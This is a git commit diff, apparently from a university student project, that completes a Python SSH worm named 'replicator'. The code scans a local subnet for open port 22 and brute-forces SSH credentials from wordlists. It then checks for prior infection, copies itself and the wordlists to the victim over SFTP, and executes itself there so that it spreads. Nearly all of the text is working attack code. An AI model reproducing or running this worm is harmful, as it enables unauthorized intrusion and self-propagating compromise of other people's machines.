8b3a90d6c8b4325eb091e6e437a1adb66e8fc544
David Poss <davidposs@csu.fullerton.edu>
2017-10-14 10:11:43 -0700

    Replicator looks all finished!

--- SSHConnection.py
+++ SSHConnection.py
@@ -16,6 +16,18 @@ class SSHConnection:
         self.username_file = None
         self.ssh_connection = paramiko.SSHClient()
         self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	self.files = []
+	self.class_file = "SSHConnection.py"
+	self.target_dir = ""
+	self.host_dir = ""
+
+    def set_files(self, list_of_files):
+	self.files = list_of_files
+	self.worm_file = list_of_files[0]
+	self.class_file = "SSHConnection.py"
+	self.password_file = list_of_files[1]
+	self.username_file = list_of_files[2]
+	self.files.append(self.class_file) 
 
     def set_password(self, password):
         self.password = password
@@ -25,7 +37,6 @@ class SSHConnection:
 
     def set_hosts(self, new_hosts):
         self.vulnerable_hosts = new_hosts
-	print (self.vulnerable_hosts)
 
     def set_target(self, host):
         self.target_host = host
@@ -39,6 +50,12 @@ class SSHConnection:
     def set_username_file(self, file_name):
         self.username_file = file_name
 
+    def set_target_dir(self, target_dir):
+	self.target_dir = target_dir
+
+    def set_host_dir(self, host_dir):
+	self.host_dir = host_dir
+
     def get_local_ip(self):
         """ Gets current machine's ip """
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -49,24 +66,26 @@ class SSHConnection:
 
     def retrieve_vulnerable_hosts(self, start_ip, max_ip):
         """ Retrieve list of hosts to attack, removes local computer """
-	print ("getting vulnerable hosts")
-	exit_code = -1
+	print ("[+] Getting vulnerable hosts")
 	port = 22
 	hosts = [start_ip + str(i) for i in range(0, max_ip)] 
 	live_hosts = []
+        local_host = self.get_local_ip()
 	for host in hosts:
-	    try:
-	    	    ssh_sock = socket.socket()
-		    ssh_sock.settimeout(20)
-		    port_status = ssh_sock.connect_ex((host,port))
-        	    if port_status == 0:
-			live_hosts.append(host)
-	    except Excption as e:
+	    if host == local_host:
+                continue
+            try:
+	        ssh_sock = socket.socket()
+	        ssh_sock.settimeout(20)
+	        port_status = ssh_sock.connect_ex((host,port))
+                if port_status == 0:
+	    	    live_hosts.append(host)
+		    print ("    [-] Added: %s" % (host))
+	    except Exception as e:
 		pass
 	    finally:
 		ssh_sock.close()
 
-        local_host = self.get_local_ip()
         """ Remove local host from list of target IPs """
         try:
             live_hosts.remove(local_host)
@@ -75,53 +94,29 @@ class SSHConnection:
 	self.vulnerable_hosts = live_hosts
 	return
 
-	"""
-	port_scanner = nmap.PortScanner()
-        port_scanner.scan(start_ip, arguments="-p 22 --open")
-        host_info = port_scanner.all_hosts()
-        live_hosts = []
-        for host in host_info:
-            if port_scanner[host].state() == "up":
-                live_hosts.append(host)
-        local_host = self.get_local_ip()
-
-        #"" Remove local host from list of target IPs ""
-        try:
-            live_hosts.remove(local_host)
-        except ValueError:
-            pass
-        self.vulnerable_hosts = live_hosts
-	print ("vulnerable hosts on next time")
-	print (self.vulnerable_hosts)
-	"""
-
     def get_usernames_and_passwords(self):
         """ Returns list of strings for usernames and passwords files """
-	print ("getting usernames and passwords")
-        with open(self.username_file, 'r') as unames:
-            usernames = unames.readlines()
-        with open(self.password_file, 'r') as passwds:
+        with open(self.host_dir + self.username_file, 'r') as unames:
+	    usernames = unames.readlines()
+        with open(self.host_dir + self.password_file, 'r') as passwds:
             passwords = passwds.readlines()
-        usernames = [username.strip() for username in usernames]
+	usernames = [username.strip() for username in usernames]
         passwords = [password.strip() for password in passwords]
-
         return (usernames, passwords)
 	
 
     def brute_force_host(self, target_host, usernames, passwords):
         """ Brute forces all a host. Returns true on success """
-	print ("Attacking %s " % (target_host))
-        for user in usernames:
+	print ("[+] Attacking %s " % (target_host))
+	for user in usernames:
             for passwd in passwords:
-		print (target_host + "  <" + user + ", " + passwd + ">")
-                try:
-		    #self.ssh_connection = paramiko.SSHClient()
-		    #self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+		print ("    [-] username: " + user + ", password: " + passwd)
+		try:
                     self.ssh_connection.connect(target_host, username=user, password=passwd)
                     self.set_target(target_host)
                     self.set_username(user)
                     self.set_password(passwd)
-		    print ("Connection established at %s" % (self.target_host))
+                    print("        Credentials found! " + user + ", " + passwd)
                     return True
                 except paramiko.AuthenticationException as e:
                     self.ssh_connection.close()
@@ -131,49 +126,40 @@ class SSHConnection:
 		    break
 		except Exception as e:
 		   continue
-
         return False
 
     def find_target_host(self):
-	print ("looking through hosts")
-	print (self.vulnerable_hosts)
         usernames, passwords = self.get_usernames_and_passwords()
-        for host in self.vulnerable_hosts:
-            self.brute_force_host(host, usernames, passwords)
-	    if self.username is not None:
-                self.place_worm()
-             	self.check_if_marked()
-                return
-            else:
-                continue
-	    print (host)
+	for host in self.vulnerable_hosts:
+            if self.brute_force_host(host, usernames, passwords):
+                if self.check_if_marked():
+		    print ("[+] Infecting %s" % (host))
+		    return host
+		else: 
+		    self.ssh_connection.close()
 	""" No host found """
 	print ("No host could be connected to")
-	sys.exit()
+	return None
 
     def check_if_marked(self):
-	print ("checking if marked")
-        stdin, stdout, stderr = self.ssh_connection.exec_command("ls /tmp/")
+        stdin, stdout, stderr = self.ssh_connection.exec_command("ls " + self.target_dir)
         results = stdout.readlines()
         results = [str(name) for name in results]
         results = [name[0:-1] for name in results]
-        if self.worm_file in results:
-            """ System is already infected, moving on """
-            return True
-        else:
-            return False
+        return not self.worm_file in results
 
     def place_worm(self):
-	print ("placing worm") 
-        sftp_client = self.ssh_connection.open_sftp()
-        sftp_client.put(self.worm_file, "/tmp/" + self.worm_file)
-        sftp_client.put(self.password_file, "/tmp/" + self.password_file)
-        sftp_client.put(self.username_file, "/tmp/" + self.username_file)
-	sftp_client.put(__name__ + ".py", "/tmp/" + __name__ + ".py")
-	self.ssh_connection.exec_command("chmod 777 /tmp/ " + self.worm_file)
-
+	sftp_client = self.ssh_connection.open_sftp()
+        for file_name in self.files:
+	    host_side = self.host_dir + file_name
+	    target_side = self.target_dir + file_name
+	    sftp_client.put(host_side, target_side)
+ 
     def start_attack(self):
-	print ("starting attack")
+	print ("[+] Starting attack on " + self.target_host)
 	marker = self.get_local_ip()
+	""" Marks which system the target got the worm from """
 	self.ssh_connection.exec_command("echo " + marker + " >> gotcha.txt")
-        self.ssh_connection.exec_command("python /tmp/" + self.worm_file)
+        """ Start the attack """
+	self.ssh_connection.exec_command("python " + self.target_dir + self.worm_file + 
+		" " + self.username_file + " " + self.password_file)
--- replicator.py
+++ replicator.py
@@ -1,32 +1,41 @@
 from SSHConnection import SSHConnection
 import sys
-
+import argparse
+import os
 
 def main():
 
-    username_file = "usernames.txt"
-    password_file = "passwords.txt"
+    """ Let user specify username and passwordfiles at command line  """
+    parser = argparse.ArgumentParser()
+    parser.add_argument("usernames", nargs=1, help="File of usernames to try", type=str)
+    parser.add_argument("passwords", nargs=1, help="File of passwords to try", type=str)
+    args = parser.parse_args()
+    username_file = args.usernames[0]
+    password_file = args.passwords[0]
 
     """ Create Instance of the SSH class """
     worm = SSHConnection()
-    worm.set_password_file(password_file)
-    worm.set_username_file(username_file)
 
-    """ Set the file to place on victim system """
-    worm.set_worm_file(sys.argv[0])
-
+    """ Set locations  to place on victim system """
+    worm_file = os.path.basename(sys.argv[0])
+    host_dir = os.path.dirname(sys.argv[0])
+    worm.set_target_dir(host_dir + "/")
+    worm.set_host_dir(host_dir + "/")
+    worm.set_files([worm_file, username_file, password_file])
+    """ Sets target directory to be same as one as where it was launched """
     """ Set default vulnerable hosts to scan """
     worm.retrieve_vulnerable_hosts("192.168.1.", 10)
-
     """ Find a target to infect, checks to make sure target hasn't previously
         been infected """
-    worm.find_target_host()
-
-    """ Mark host system"""
-    worm.place_worm()
-    """ Start attack from new system """
-    worm.start_attack()
-
+    if worm.find_target_host():
+        """ Mark host system"""
+        worm.place_worm()
+        """ Start attack from new system """
+        worm.start_attack()
+    else:
+        with open ("/tmp/no_found_hosts.txt", "w") as no_hosts:
+            no_hosts.write("no hosts found")
+    return
 
 if __name__ == "__main__":
     main()
